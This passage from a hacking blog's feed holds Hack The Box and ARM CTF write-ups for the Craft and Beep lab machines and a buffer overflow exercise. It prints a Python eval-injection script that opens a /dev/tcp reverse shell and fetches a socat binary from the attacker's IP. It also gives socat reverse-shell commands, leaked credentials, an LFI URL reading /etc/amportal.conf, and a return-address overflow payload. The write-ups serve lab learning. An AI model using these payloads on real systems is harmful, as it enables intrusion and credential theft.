response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;https://api.craft.htb/api/auth/login&#39;</span>,  auth<span style="color:#f92672">=</span>(<span style="color:#e6db74">&#39;dinesh&#39;</span>, <span style="color:#e6db74">&#39;4aUh0A8PbVJxgd&#39;</span>), verify<span style="color:#f92672">=</span>False)
json_response <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(response<span style="color:#f92672">.</span>text)
token <span style="color:#f92672">=</span>  json_response[<span style="color:#e6db74">&#39;token&#39;</span>]

headers <span style="color:#f92672">=</span> { <span style="color:#e6db74">&#39;X-Craft-API-Token&#39;</span>: token, <span style="color:#e6db74">&#39;Content-Type&#39;</span>: <span style="color:#e6db74">&#39;application/json&#39;</span>  }

<span style="color:#75715e"># make sure token is valid</span>
response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;https://api.craft.htb/api/auth/check&#39;</span>, headers<span style="color:#f92672">=</span>headers, verify<span style="color:#f92672">=</span>False)
<span style="color:#66d9ef">print</span>(response<span style="color:#f92672">.</span>text)

<span style="color:#75715e"># create a sample brew with bogus ABV... should fail.</span>

<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Create bogus ABV brew&#34;</span>)
brew_dict <span style="color:#f92672">=</span> {}
brew_dict[<span style="color:#e6db74">&#39;abv&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;__import__(&#34;os&#34;).system(&#34;bash -i &gt;&amp; /dev/tcp/&lt;my_ip&gt;/44226 0&gt;&amp;1&#34;)&#39;</span>
brew_dict[<span style="color:#e6db74">&#39;name&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;hacking ya&#39;</span>
brew_dict[<span style="color:#e6db74">&#39;brewer&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;bullshit&#39;</span>
brew_dict[<span style="color:#e6db74">&#39;style&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;bullshit&#39;</span>

json_data <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>dumps(brew_dict)
<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;attempting hack...&#39;</span>)
response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#39;https://api.craft.htb/api/brew/&#39;</span>, headers<span style="color:#f92672">=</span>headers, data<span style="color:#f92672">=</span>json_data, verify<span style="color:#f92672">=</span>False)
<span style="color:#66d9ef">print</span>(response<span style="color:#f92672">.</span>text)
</code></pre></div><p>The important part is <code>brew_dict['abv'] = '__**import__**(&quot;os&quot;).system(&quot;bash -i &gt;&amp; /dev/tcp/&lt;my_ip&gt;/44226 0&gt;&amp;1&quot;)'</code></p>
<p>The problem with using <code>os.system()</code> in python is that it requires <code>import os</code> to be present at by the time it reaches <code>os.system()</code>, otherwise it won&rsquo;t know what to do. You can get around this by using the global namespace for import like I did in the line above. Definitely something new I learned figuring that out.</p>
<p>However, after several attempts I was unable to get a reverse shell. I suspected one of two things was possible:</p>
<ol>
<li>My formatting for the eval was wrong.</li>
<li>The environment flask was running is was locked down.</li>
</ol>
<p>To rule out number one I simplified my command. I had the server attempt to download a file from my machine using wget, and while I&rsquo;m having it download a file it might as well be a <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat">static socat binary</a> that I can use to get a full TTY reverse shell.</p>
<p>After downloading the file, I serve it up using a simple Python command:</p>
<p><code>python -m SimpleHTTPServer</code></p>

    <figure class="left" >
        <img src="image.webp"   />

        
    </figure>


<p>After that, I modify my script to download the socat binary from my server:</p>
<p><code>brew_dict['abv'] = '**import**(&quot;os&quot;).system(&quot;wget http://10.10.14.15:8000/socat &quot;)'</code></p>
<p>Then run the script:</p>
<p><code>python3 make_shell.py</code></p>
<p>And finally check if our server was accessed:</p>

    <figure class="left" >
        <img src="image-1.webp"   />

        
    </figure>



<figure class='left'>
  <video style="height:100%;width:100%" src="swanson.webm" loop="true" autoplay="true" muted="true"
    playsinline="true">
  </video>

</figure>

<p>Success! It&rsquo;s not a shell, but it&rsquo;s a start and confirms that I can execute commands on the machine. It&rsquo;s time to modify the script to have it use socat to create a reverse shell. I can do this using the following commands:</p>
<p>Listener: <code>socat file:$(tty),raw,echo=0 tcp-listen:44226</code></p>
<p>Victim: <code>socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.15:44226</code></p>
<p>A couple of things:</p>
<ol>
<li>The socat file on the victim needs to have execute permissions added.</li>
<li>The command to connect via socat also needs to be modified since it&rsquo;s using quotes, and the newly downloaded socat isn&rsquo;t in PATH.</li>
</ol>
<p>To solve those issues I added a chmod +x command, escaped the quotes, and added a ./ in front of the socat so linux knows to look in the current folder for it. The end result is this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">brew_dict[<span style="color:#e6db74">&#39;abv&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;__import__(&#34;os&#34;).system(&#34;chmod +x socat; ./socat exec:&#39;</span>sh <span style="color:#f92672">-</span>li<span style="color:#e6db74">&#39;,pty,stderr,setsid,sigint,sane tcp:10.10.14.15:44226&#34;)&#39;</span>
</code></pre></div><p>Well crap&hellip; none of that is working. I played around and still no luck&hellip; Then I realized, I have no idea what kind of shell they are using, but I know they can execute python3 based on the git repository. I decided to try my luck with a reverse shell written in python that uses sockets instead of a shell.</p>
<p>I found one here: <a href="https://github.com/trackmastersteve/shell">https://github.com/trackmastersteve/shell</a>, changed the IP/Port info in both files, started the listener, and executed the following command on the victim:<code>brew_dict['abv'] = '**import**(&quot;os&quot;).system(&quot;python3 ./shell.py&quot;)'</code></p>

    <figure class="left" >
        <img src="image-3.webp"   />

        
    </figure>



<figure class='left'>
  <video style="height:100%;width:100%" src="2.webm" loop="true" autoplay="true" muted="true"
    playsinline="true">
  </video>

</figure>

<p>Success! But&hellip; wait&hellip; I&rsquo;m root? Hmmm&hellip; that seemed very suspicious to me. I started poking around and found:</p>
<ol>
<li>My socat binary didn&rsquo;t work, has a syntax error.</li>
<li>I&rsquo;m not really root, this is stuck in a busybox shell.</li>
<li>It looks like we are in a docker environment.</li>
</ol>
<p>I also found a juicy settings file that contains DB credentials, and a secret key used to generate valid tokens from username + timestamp. This means I can generate a token for any user without the password.</p>
<p>After messing around long enough with the python shell I also managed to get a working socat binary on the machine to upgrade my shell to full TTY.</p>
<p>I modified my script to use this:</p>
<p><code>brew_dict['abv'] = '**import**(&quot;os&quot;).system(&quot;./socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.15:44227&quot;)'</code></p>
<p>It will now successfully connect to my socat listener, and give me autocomplete, ctrl hotkeys, the full monty!</p>
<hr>
<h1 id="pivoting-for-more-access">Pivoting for More Access</h1>
<p>Now I might have a full TTY shell, but I still have very limited access. I did some poking around and found a settings.py file with a bunch of secrets for the API:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Flask settings</span>
FLASK_SERVER_NAME <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;api.craft.htb&#39;</span>
FLASK_DEBUG <span style="color:#f92672">=</span> False  <span style="color:#75715e"># Do not use debug mode in production</span>

<span style="color:#75715e"># Flask-Restplus settings</span>
RESTPLUS_SWAGGER_UI_DOC_EXPANSION <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;list&#39;</span>
RESTPLUS_VALIDATE <span style="color:#f92672">=</span> True
RESTPLUS_MASK_SWAGGER <span style="color:#f92672">=</span> False
RESTPLUS_ERROR_404_HELP <span style="color:#f92672">=</span> False
CRAFT_API_SECRET <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;hz66OCkDtv8G6D&#39;</span>

<span style="color:#75715e"># database</span>
MYSQL_DATABASE_USER <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;craft&#39;</span>
MYSQL_DATABASE_PASSWORD <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;qLGockJ6G2J75O&#39;</span>
MYSQL_DATABASE_DB <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;craft&#39;</span>
MYSQL_DATABASE_HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;db&#39;</span>
SQLALCHEMY_TRACK_MODIFICATIONS <span style="color:#f92672">=</span> False
</code></pre></div><p>Just look at all those juicy secrets! An inspection of the environment variables reveals something interesting as well:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">GPG_KEY<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D&#39;</span>
</code></pre></div><p>Searching this key reveals that it&rsquo;s part of a python 3.6 docker instance. Hmmm, I need to escape this docker instance somehow. I have doubts that it will be via an exploit, rather it will probably involve the found credentials and API key.</p>
<p>So let&rsquo;s see if we can access the database. I can modify the DB test script to do this since the database is only available internally. I could also set up a proxy and use a mySQL client, but the python is already set up to work so I&rsquo;m going to take the path of least resistance here.</p>
<p>Here&rsquo;s my modified DBTest script:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>

<span style="color:#f92672">import</span> pymysql
<span style="color:#f92672">from</span> craft_api <span style="color:#f92672">import</span> settings

<span style="color:#75715e"># test connection to mysql database</span>

connection <span style="color:#f92672">=</span> pymysql<span style="color:#f92672">.</span>connect(host<span style="color:#f92672">=</span>settings<span style="color:#f92672">.</span>MYSQL_DATABASE_HOST,
                             user<span style="color:#f92672">=</span>settings<span style="color:#f92672">.</span>MYSQL_DATABASE_USER,
                             password<span style="color:#f92672">=</span>settings<span style="color:#f92672">.</span>MYSQL_DATABASE_PASSWORD,
                             db<span style="color:#f92672">=</span>settings<span style="color:#f92672">.</span>MYSQL_DATABASE_DB,
                             cursorclass<span style="color:#f92672">=</span>pymysql<span style="color:#f92672">.</span>cursors<span style="color:#f92672">.</span>DictCursor)

<span style="color:#66d9ef">try</span>:
    <span style="color:#66d9ef">with</span> connection<span style="color:#f92672">.</span>cursor() <span style="color:#66d9ef">as</span> cursor:
        sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;show databases&#34;</span>
        cursor<span style="color:#f92672">.</span>execute(sql)
        results <span style="color:#f92672">=</span> cursor<span style="color:#f92672">.</span>fetchall()
        <span style="color:#66d9ef">print</span>(results)

<span style="color:#66d9ef">finally</span>:
    connection<span style="color:#f92672">.</span>close()
</code></pre></div><p>I&rsquo;ve modified it to use fetch_all instead of fetch_one, and can execute any SQL command I want. First I <code>show databases</code>, and see that it&rsquo;s only <code>craft</code> and <code>information_schema</code>. The db= in the connection string resolves to <code>craft</code>, so I can do a <code>show tables</code> command to see what&rsquo;s in there.</p>
<p>Looks like it&rsquo;s only two tables, <code>craft</code> which contains the beer info, and <code>user</code> which contains the username and passwords for generating API tokens. I can then do <code>select * from user</code> to get it all:</p>
<p><code>[{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]</code></p>
<p>And there we have it. Granted it&rsquo;s just for generating an API token, but maybe someone has reused one of their passwords.</p>
<p>No luck with SSH. I tried both port 22, and 6022 but was denied in both. They might work in gogs however.</p>

    <figure class="left" >
        <img src="image-4.webp"   />

        
    </figure>


<p>And&hellip; success! It looks like Gilfoyle has some non-public repos to explore. I took a look at the nginx config file and found a new vhost: <code>vault.craft.htb</code> I added it to <code>/etc/hosts</code> and took a look.</p>

    <figure class="left" >
        <img src="image-5.webp"   />

        
    </figure>


<p>Well&hellip; hmmm&hellip; Time for some more research. I found a commit that disabled the vault UI, it looks like there&rsquo;s a listener at port 8200 though. More digging&hellip;.</p>
<p>Well&hellip; What&rsquo;s this??</p>

    <figure class="left" >
        <img src="1578158745.webp"   />

        
    </figure>


<p>An OpenSSH private key on his private git. Why hello there darlin&rsquo;, let&rsquo;s take you out for a spin. I copied the key into a new file with nano, saved and modified the permissions (ssh requires this to work), then attempted to log in via ssh:</p>
<p><code>root@wks104:~/craft# chmod 600 gilfoyle.keyroot@wks104:~/craft# ssh gilfoyle@craft.htb -i gilfoyle.key</code></p>

    <figure class="left" >
        <img src="image-6.webp"   />

        
    </figure>



<figure class='left'>
  <video style="height:100%;width:100%" src="thumbsup.webm" loop="true" autoplay="true" muted="true"
    playsinline="true">
  </video>

</figure>

<p>There&rsquo;s the user flag. I was almost stymied at the required passphrase on the key, but the same password Gilfoyle used for git was used here! For shame&hellip; for as much smack as Gilfoyle talks on Dinesh, he has reused his password in three places here.</p>
<p>Now that we have a solid foothold it&rsquo;s time to escalate our priveleges.</p>
<hr>
<h1 id="gaining-root-access">Gaining Root Access</h1>
<p>The first thing I do when attempting privelege escalation is to check the sudoers file. Actually, I lied, the first thing I do is check the shell I&rsquo;m in to see if it&rsquo;s restricted. This is accomplished via: <code>echo $0</code></p>
<p>Looks like this one has bash:</p>

    <figure class="left" >
        <img src="image-7.webp"   />

        
    </figure>


<p>Next onto the sudoers file:</p>
<p><code>cat /etc/sudoers</code></p>
<p><code>sudo -l</code></p>

    <figure class="left" >
        <img src="image-8.1.webp"   />

        
    </figure>


<p>No sudo on this machine. Now normally I would proceed to use both LinuxEnum.sh and linuxprivchecker.py, but something stuck out when I was trifling through Gilfoyle&rsquo;s git branch.</p>

    <figure class="left" >
        <img src="image-91.webp"   />

        
    </figure>


<p>This script looks like it enables some form of OTP for root access via SSH. I did some googling and found out more:</p>
<p>It&rsquo;s a program called <a href="https://www.vaultproject.io/">Vault</a> by Hashicorp. It&rsquo;s a server which handles secret management that serves up access over HTTP, and a local client as well. I went through the tutorial and started looking for secrets.</p>
<p>Vault was indeed installed and running on the machine, the command line interface worked just fine. I attempted to find anything at all in the data storage of the program:</p>
<p><code>vault secrets list</code></p>

    <figure class="left" >
        <img src="image-101.webp"   />

        
    </figure>


<p>Now that I know the paths for possible secrets I can iterate through them:</p>
<p><code>root@craft:~# vault list /cubbyhole</code></p>

    <figure class="left" >
        <img src="image-111.webp"   />

        
    </figure>


<p>No entry&hellip; It seems I have to login somehow. I did some more digging in the vault docs and found that I could create a token, and login with that token locally.</p>
<p><code>vault token create</code></p>
<p><code>vault login 9716e52b-d838-38bf-e495-ca32ff66c521</code></p>
<p><code>vault list /cubbyhole</code></p>
<p>It worked! No more permission denied errors. I proceeded to check all the other secret engines, but no luck, there was nothing in any of them. I wanted to learn more about the SSH engine though so back the the docs! I came across this page:</p>
<p><a href="https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html">https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html</a></p>
<p>It explained the process a bit more, and gave a nice one-liner to use</p>
<p><code>vault ssh -role otp_key_role -mode otp username@x.x.x.x</code></p>
<p>I know from Gilfoyle&rsquo;s git page the SSH OTP is enabled, and the role is root_otp. I filled in the blanks and executed the command:</p>
<p><code>vault ssh -role root_otp -mode otp root@localhost</code></p>

    <figure class="left" >
        <img src="image-12.webp"   />

        
    </figure>


<p>Ah ha! I have a password prompt, and an OTP. So copy and paste OTP, cross fingers&hellip;</p>

    <figure class="left" >
        <img src="image1.webp"   />

        
    </figure>



<figure class='left'>
  <video style="height:100%;width:100%" src="success.webm" loop="true" autoplay="true" muted="true"
    playsinline="true">
  </video>

</figure>

<p>A very cool box. Until next time hackers, this is jivex5k signing off!</p>
]]></content>
        </item>
        
        <item>
            <title>Hack The Box - Beep</title>
            <link>https://foresthex.com/posts/hack-the-box-beep/</link>
            <pubDate>Sun, 13 Oct 2019 00:00:00 +0000</pubDate>
            
            <guid>https://foresthex.com/posts/hack-the-box-beep/</guid>
            <description>Welcome to another Forest Hex hacking adventure! üå≤üèπ Today&amp;rsquo;s plan is to explore a retired CTF from http://hackthebox.eu named &amp;ldquo;Beep&amp;rdquo;. I chose this box because it&amp;rsquo;s easy, it&amp;rsquo;s linux, and it&amp;rsquo;s rated very highly. All that put together should add up to some serious fun, so let&amp;rsquo;s get started:
  Port Scan Poking around the mySql Server Checking out Webmin Hylafax, what are you hiding? Back to Elastix Getting User and Root   Port Scan The first thing, as always, is a port scan:</description>
            <content type="html"><![CDATA[<h3 id="welcome-to-another-forest-hex-hacking-adventure-">Welcome to another Forest Hex hacking adventure! üå≤üèπ</h3>
<p>Today&rsquo;s plan is to explore a retired CTF from <a href="http://hackthebox.eu">http://hackthebox.eu</a> named &ldquo;Beep&rdquo;. I chose this box because it&rsquo;s easy, it&rsquo;s linux, and it&rsquo;s rated very highly. All that put together should add up to some serious fun, so let&rsquo;s get started:</p>

    <figure class="left" >
        <img src="2019-10-13-18-43-45.webp"   />

        
    </figure>


<ul>
<li><a href="#port-scan">Port Scan</a></li>
<li><a href="#poking-around-the-mysql-server">Poking around the mySql Server</a></li>
<li><a href="#checking-out-webmin">Checking out Webmin</a></li>
<li><a href="#hylafax--what-are-you-hiding-">Hylafax, what are you hiding?</a></li>
<li><a href="#back-to-elastix">Back to Elastix</a></li>
<li><a href="#getting-user-and-root">Getting User and Root</a></li>
</ul>
<hr>
<h1 id="port-scan">Port Scan</h1>
<p>The first thing, as always, is a port scan:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
</span><span style="color:#75715e"></span>ports<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>nmap -p- --min-rate<span style="color:#f92672">=</span><span style="color:#ae81ff">1000</span> -T4 $1 | grep ^<span style="color:#f92672">[</span>0-9<span style="color:#f92672">]</span> | cut -d <span style="color:#e6db74">&#39;/&#39;</span> -f <span style="color:#ae81ff">1</span> | tr <span style="color:#e6db74">&#39;\n&#39;</span> <span style="color:#e6db74">&#39;,&#39;</span> | sed s/,$//<span style="color:#66d9ef">)</span>
nmap -sC -sV -p$ports $1
</code></pre></div><p>Using my bash script (which was taken from an HTB official writeup) we can ensure every port is checked, and that a deeper scan is only performed on open ports.</p>

    <figure class="left" >
        <img src="2019-10-13-19-53-19.webp"   />

        
            <figcaption class="center" >Nmap Results</figcaption>
        
    </figure>



<figure class='left'>
  <video style="height:100%;width:100%" src="dino.webm" loop="true" autoplay="true" muted="true"
    playsinline="true">
  </video>

</figure>

<p>That&rsquo;s a ton of stuff, let&rsquo;s save the output in Cherry Tree and start digging. First let&rsquo;s check out the website.

    <figure class="left" >
        <img src="2019-10-13-20-23-24.webp"   />

        
            <figcaption class="center" >Login Portal</figcaption>
        
    </figure>

</p>
<p>Ah, some kind of login called elastix. I looked up some default logins but none of them worked, ah well, I&rsquo;ll take some notes and move on.</p>
<hr>
<h1 id="poking-around-the-mysql-server">Poking around the mySql Server</h1>
<p>There&rsquo;s a mySql server running on port 3306, so I attempted to login with no password:

    <figure class="left" >
        <img src="2019-10-13-20-56-05.webp"   />

        
            <figcaption class="center" >Trying to login to mySql</figcaption>
        
    </figure>

</p>
<p>No luck, and from the error it sounds like it&rsquo;s a dead end until we have a shell.</p>
<hr>
<h1 id="checking-out-webmin">Checking out Webmin</h1>
<p>There&rsquo;s a server running on port 10000 which nmap identified as Webmin. Sure enough navigating there brought me to a login page. I decided to try several default logins, and after a bit, well&hellip;

    <figure class="left" >
        <img src="2019-10-13-21-06-43.webp"   />

        
    </figure>

</p>
<p>Maybe there&rsquo;s an exploit for it we can use. We have the version number from nmap: MiniServ 1.570</p>

    <figure class="left" >
        <img src="2019-10-13-21-09-16.webp"   />

        
            <figcaption class="center" >Webmin Exploits</figcaption>
        
    </figure>


<p>There&rsquo;s a couple, namely the RCE ones, but the one that doesn&rsquo;t require user auth isn&rsquo;t for our version unfortunately. Onward to explore other services!</p>
<hr>
<h1 id="hylafax-what-are-you-hiding">Hylafax, what are you hiding?</h1>
<p>Hylafax sounds interesting, let&rsquo;s do some digging with searchsploit:

    <figure class="left" >
        <img src="2019-10-13-21-21-09.webp"   />

        
            <figcaption class="center" >Hylafax Exploits</figcaption>
        
    </figure>

</p>
<p>Damn, nothing for version 4.3.1, ah well that&rsquo;s the breaks. Time to keep searching.</p>
<hr>
<h1 id="back-to-elastix">Back to Elastix</h1>
<p>I realized I had not looked at any elastix exploits yet, time to rectify that.</p>

    <figure class="left" >
        <img src="2019-10-13-21-42-57.webp"   />

        
    </figure>


<p>The Blind SQL Injection, and PHP Code Injection both look pretty interesting. Long story short, I couldn&rsquo;t get them to work.
After a lot of messing around I decided to go back to the list and try the next one, which was an LFI exploit.</p>
<p>Checking out the exploit we can see it just crafts a URL:
<code>/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action</code></p>
<p>To quickly test this exploit I simply pasted it after the URL:

    <figure class="left" >
        <img src="2019-10-13-22-12-09.webp"   />

        
            <figcaption class="center" >A local file from the webserver.</figcaption>
        
    </figure>

</p>
<p>Paydirt&hellip; We have a local config file, and from the look of it a lot of passwords.</p>
<h1 id="getting-user-and-root">Getting User and Root</h1>
<p>I noticed the config file mentioned FreePBX, part of an RCE exploit. I tried to get this to work but it wouldn&rsquo;t, I suspect perl isn&rsquo;t available on the remote system.</p>
<p>I went back to the config and started looking for credentials to use. I noticed <code>jEhdIekWmdjE</code> was repeating a lot and decided to see if the box reused passwords for the root ssh login. Sure enough <code>jEhdIekWmdjE</code> unlocked it.</p>

    <figure class="left" >
        <img src="2019-10-13-23-28-32.webp"   />

        
            <figcaption class="center" >Root and User Flag</figcaption>
        
    </figure>


<hr>
<p>Until next time, this is jivex5k signing off.</p>
]]></content>
        </item>
        
        <item>
            <title>Buffer Overflow on ARM - Part 2</title>
            <link>https://foresthex.com/posts/buffer-overflow-on-arm-part-2/</link>
            <pubDate>Wed, 04 Sep 2019 02:30:14 +0000</pubDate>
            
            <guid>https://foresthex.com/posts/buffer-overflow-on-arm-part-2/</guid>
            <description>Hello again faithful readers! Today we are going to explore another buffer overflow on an ARM binary. The previous challenge involved overwriting a variable. This one is going to overflow the return address instead.
What&amp;rsquo;s the return address? The return address is a value stored on the stack whenever a function is called. After the function finishes, the CPU will load the value of the return address and attempt to execute the data there.</description>
            <content type="html"><![CDATA[<p>Hello again faithful readers! Today we are going to explore another buffer overflow on an ARM binary. The previous challenge involved overwriting a variable. This one is going to overflow the return address instead.</p>
<h2 id="whats-the-return-address">What&rsquo;s the return address?</h2>
<p>The return address is a value stored on the stack whenever a function is called. After the function finishes, the CPU will load the value of the return address and attempt to execute the data there. This means if we can overflow the return address we can get the CPU to jump to any memory address.</p>
<hr>
<h1 id="exploring-the-challenge">Exploring the Challenge</h1>
<p>Here&rsquo;s the source code for this challenge:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;flag.h&#34;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">win</span>()
{
        printf(<span style="color:#e6db74">&#34;Wait, what? How?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, FLAG);
}

<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">test</span>()
{
        <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">0x80</span>];
        printf(<span style="color:#e6db74">&#34;This time, there really is no way to get to the flag.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Do you finally give up?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
        gets(buffer);
        <span style="color:#66d9ef">if</span>(strcmp(buffer,<span style="color:#e6db74">&#34;Yes&#34;</span>)){
                printf(<span style="color:#e6db74">&#34;That wasn&#39;t a </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">Yes</span><span style="color:#ae81ff">\&#34;\n</span><span style="color:#e6db74">You better give up now</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
        }
        <span style="color:#66d9ef">else</span>
        {
                printf(<span style="color:#e6db74">&#34;Damn right</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
        }
}

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
{
        test();
}
</code></pre></div><p>The important bits:</p>
<ol>
<li>The function which prints the flag, <code>win()</code> is never called in this code.</li>
<li>The input is evaluated by calling the function <code>test()</code>.</li>
<li><code>gets()</code> is used again to store the input in memory.</li>
<li>The buffer for the input is <code>128 bytes</code> in size.</li>
</ol>
<p>This all means we can overflow the memory, into the return address, and point the execution to whatever address we like.</p>
<h2 id="finding-the-right-address">Finding the Right Address</h2>
<p>To find the right address we are going to take a look at the assembly of the binary. There&rsquo;s a lovely tool in Linux called <code>objdump</code> that will output the assembly if given the <code>-d</code> tag.</p>
<p>Now, when I tried a standard <code>objdump -d</code> the program complained about the architecture being unknown. After a quick search I tried <code>objdump -d -m arm</code>, but it complained about not being able to do that.</p>
<p>Another, somewhat longer search, eventually led to the solution:</p>
<p><code>apt install gcc-arm-none-eabi</code></p>
<p><code>arm-none-eabi-objdump -d a.outl</code></p>
<p>That apt package installed an arm specifc objdump, and from that I was able to get the assembly. It outputs quite a lot that&rsquo;s not relevant to our current interests, so I ran it again and piped it into a grep statement:</p>
<p><code>arm-none-eabi-objdump -d a.out | grep win</code></p>

    <figure class="left" >
        <img src="win_address.webp"   />

        
            <figcaption class="center" >Memory address of win()</figcaption>
        
    </figure>


<p>There&rsquo;s our address: <code>000104b0</code></p>
<p>If we overwrite the return address with that value, it should continue through the <code>win()</code> function which will print our flag.</p>
<h1 id="crafting-the-payload">Crafting the Payload</h1>
<p>We have 128 bytes to enter before we being to overflow. After that we begin to overflow into memory used for other purposes. Last time it was used for another variable, but this time there is no such variable declared so we end up overflowing into the metadata of the stack.</p>
<p>When a function is called in ARM assembly, the function creates a &ldquo;stack frame&rdquo;. There&rsquo;s a lot of that can be said about this concept, but we can get some help using this image from Azeria Labs:</p>

    <figure class="left" >
        <img src="stack.webp"   />

        
            <figcaption class="center" >Stack layout during function call.</figcaption>
        
    </figure>


<p>From the image we can see the local variables are stored immediately before the frame pointer (FP), and link register (LR). These are both 4 byte memory addresses stored on the stack. The link register is also known as the return address, so that&rsquo;s the value we want to overwrite with <code>000104b0</code> to jump to the <code>win()</code> function.</p>
<p>To do so we fill up our local variable with 128 bytes + 4 bytes to overwrite the frame pointer (this can be whatever we want), and finally 4 more to overwrite the link register, AKA return address.</p>
<h2 id="theres-one-catch-though">There&rsquo;s one catch though&hellip;</h2>
<p>We have to write the memory address backwards, one byte at a time. This is because the binary we are exploiting was compiled for ARM in Little Endian mode. There&rsquo;s a lot that can be said about that, but suffice to say for this post we need to simply be aware of this fact and adjust our payload properly.</p>
<p>So <code>00 01 04 b0</code> becomes <code>b0 04 01 00</code>. Our final payload becomes</p>
<p><code>128 bytes of anything for buffer</code> + <code>4 bytes of anything to overwrite frame pointer</code> + <code>address we want to jump to</code></p>
<p>We can use python to pipe the payload into netcat like so:</p>
<p><code>python -c 'print(&quot;\x41&quot;*132 + &quot;\xb0\x04\x01\x00&quot;)' | nc localhost 9003</code></p>

    <figure class="left" >
        <img src="flag2.webp"   />

        
            <figcaption class="center" >Overflow working.</figcaption>
        
    </figure>


<h1 id="bingo-theres-our-flag">Bingo, there&rsquo;s our flag.</h1>
<p>You might have noticed it shows the failure message first. That&rsquo;s because the overflow doesn&rsquo;t affect anything until the function completes, and the return popped off the stack so execution can jump to it.</p>
]]></content>
        </item>
        
        <item>
            <title>ARM CTF - Sending Bytes</title>
            <link>https://foresthex.com/posts/arm-ctf-sending-bytes/</link>
            <pubDate>Mon, 02 Sep 2019 23:34:59 +0000</pubDate>
            
            <guid>https://foresthex.com/posts/arm-ctf-sending-bytes/</guid>
            <description>Why hello there faithful reader! It&amp;rsquo;s time again for another hacking related post.
Today we&amp;rsquo;ll be continuing on from our last post where we executed a buffer overflow to overwrite a secret number to reveal a flag.
So, a quick recap:
 We have a buffer overflow for a service which accepts our input. We can send it anything we want, if we have some way to represent non-printable characters. We need to send it 129 bytes, with the first being 0x0 and the last being \n The program lives on a remote server that we can connect via an IPv4 address.</description>
            <content type="html"><![CDATA[<p>Why hello there faithful reader! It&rsquo;s time again for another hacking related post.</p>
<p>Today we&rsquo;ll be continuing on from our <a href="https://foresthex.com/buffer-overflow-on-arm/">last post</a> where we executed a buffer overflow to overwrite a secret number to reveal a flag.</p>
<p>So, a quick recap:</p>
<ol>
<li>We have a buffer overflow for a service which accepts our input.</li>
<li>We can send it anything we want, if we have some way to represent non-printable characters.</li>
<li>We need to send it 129 bytes, with the first being <code>0x0</code> and the last being <code>\n</code></li>
<li>The program lives on a remote server that we can connect via an IPv4 address.</li>
</ol>
<h2 id="how-to-connect">How to connect?</h2>
<p>Well, there&rsquo;s more than one way to skin a cat, and the quickest way to get an interface is using a program called <code>netcat</code>.</p>
